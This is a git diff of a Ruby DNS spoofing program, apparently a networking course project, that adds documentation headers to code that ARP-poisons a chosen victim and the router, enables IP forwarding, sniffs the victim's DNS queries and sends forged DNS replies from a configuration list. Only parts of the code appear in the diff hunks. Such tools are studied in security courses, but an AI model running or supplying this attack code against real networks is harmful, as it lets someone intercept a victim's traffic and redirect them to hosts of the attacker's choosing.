@@ -1,11 +1,38 @@
 #!/usr/bin/ruby
+############################################################################################################
+##	SOURCE FILE:		dnsspoof.rb - a dns spoofer in ruby
+##
+##	PROGRAM:		    dnsspoof
+##
+##	FUNCTIONS:		    runspoof
+##                    check_spoof
+##                    sendResponse
+##                    get_info
+##                    sniff
+##
+##	LAST MODIFIED:		November 2, 2014
+##
+##	DESIGNERS:	        Zach Smoroden & Slade Solobay
+##                      Some code taken from Aman Abdulla's example
+##
+##	PROGRAMMERS:        Slade Solobay & Zach Smoroden
+##
+##	NOTES:
+##	        This program will arp poison the victim of your choosing and then spoof dns responses as
+##  	      per the configuration file.
+##
+##  OUTPUT: nil
+##
+##	USAGE: ruby dnsspoof.rb -v [target_ip]
+##
+##############################################################################################################
+
 require 'rubygems'
 require 'packetfu'
 require 'thread'
 require 'macaddr'
 require 'optparse'
 require_relative 'utils.rb'
-
 include PacketFu
 
 # Set up the rules for spoofing
@@ -23,7 +50,7 @@ config.each_line do |line|
 
 end
 
-#parse command line arguments
+# Parse command line arguments
 OptionParser.new do |opts|
   opts.on("-h", "--help", "usage and program help") do
     usage()
@@ -40,7 +67,7 @@ OptionParser.new do |opts|
   end
 end.parse!
 
-#did they supply a victim and an address to spoof to?
+# Did they supply a victim and an address to spoof to?
 if $target_ip.nil?
   abort("You must specify the victim's IP address and an IP address to spoof!")
 end
@@ -75,7 +102,29 @@ arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP repl
 
 # Enable IP forwarding
 `echo 1 > /proc/sys/net/ipv4/ip_forward`
-
+######################################################################
+##	FUNCTION:	    runspoof
+##
+##	INTERFACE:	    runspoof(arp_packet_target,arp_packet_router)
+##
+##				    arp_packet_target:   The crafted ARP packet to be sent to the victim
+##
+##            arp_packet_router:    The crafted ARP packet to be sent to the router
+##
+##
+##	RETURNS:        Nothing
+##
+##	LAST MODIFIED:  Nov 1, 2014
+##
+##	DESIGNERS:	    Aman Abdulla
+##
+##	PROGRAMMERS:	Aman Abdulla
+##
+##	NOTES:
+##	        This is used as a thread function. It will send the packets every second.
+##
+##
+######################################################################
 def runspoof(arp_packet_target,arp_packet_router)
   # Send out both packets
   puts "Spoofing...."
@@ -86,7 +135,28 @@ def runspoof(arp_packet_target,arp_packet_router)
     arp_packet_router.to_w($iface)
   end
 end
-
+######################################################################
+##	FUNCTION:	    check_spoof
+##
+##	INTERFACE:	    check_spoof(domainName)
+##
+##				    domainName:   The domain name to test against the spoof list
+##
+##
+##
+##	RETURNS:        the spoofed ip address or nil
+##
+##	LAST MODIFIED:  Nov 1, 2014
+##
+##	DESIGNERS:	    Zach Smoroden & Slade Solobay
+##
+##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
+##
+##	NOTES:
+##	        Makes the configure file actualy work.
+##
+##
+######################################################################
 def check_spoof(domainName)
   $spoof_hash.each_key do |k|
     if domainName =~ /#{k}/
@@ -95,7 +165,29 @@ def check_spoof(domainName)
   end
   return nil
 end
-
+######################################################################
+##	FUNCTION:	    sendResponse
+##
+##	INTERFACE:	    sendResponse(packet, domainName, spoof_ip)
+##
+##            packet:       The full DNS packet
+##				    domainName:   The domain name to test against the spoof list
+##            spoof_ip:     The ip to spoof
+##
+##
+##	RETURNS:        nothing
+##
+##	LAST MODIFIED:  Nov 1, 2014
+##
+##	DESIGNERS:	    Modified from Luke Queenan | crushbeercrushcode.org
+##
+##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
+##
+##	NOTES:
+##	        Crafts and sends the DNS response
+##
+##
+######################################################################
 def sendResponse(packet, domainName, spoof_ip)
 
   # Convert the IP address
@@ -140,7 +232,28 @@ def sendResponse(packet, domainName, spoof_ip)
 end
 
 
-
+######################################################################
+##	FUNCTION:	    get_info
+##
+##	INTERFACE:	    get_info(packet)
+##
+##            packet:       The full DNS packet
+##
+##
+##
+##	RETURNS:        the domain name
+##
+##	LAST MODIFIED:  Nov 1, 2014
+##
+##	DESIGNERS:	    Zach Smoroden & Slade Solobay
+##
+##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
+##
+##	NOTES:
+##	        Gets the domain name from the packet.
+##
+##
+######################################################################
 def get_info(packet)
   # Get the length of the first domain level (in hex)
   len = "0x"+packet.payload[11].unpack('h*')[0].chr+packet.payload[12].unpack('h*')[0].chr
@@ -192,7 +305,29 @@ def get_info(packet)
   return domain
 end
 
-# Opens up the nic for capture.
+######################################################################
+##	FUNCTION:	    sniff
+##
+##	INTERFACE:	    sniff(iface)
+##
+##            iface:        The network interface to capture packets
+
+##
+##
+##	RETURNS:        nothing
+##
+##	LAST MODIFIED:  Nov 1, 2014
+##
+##	DESIGNERS:	    Zach Smoroden & Slade Solobay
+##
+##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
+##
+##	NOTES:
+##	        Sniffs network traffic, finds DNS packets and then deals with them
+##          appropriately.
+##
+##
+######################################################################
 def sniff(iface)
   puts 'Sniffing...'
   cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53 and src host ' + $target_ip, :save => true)
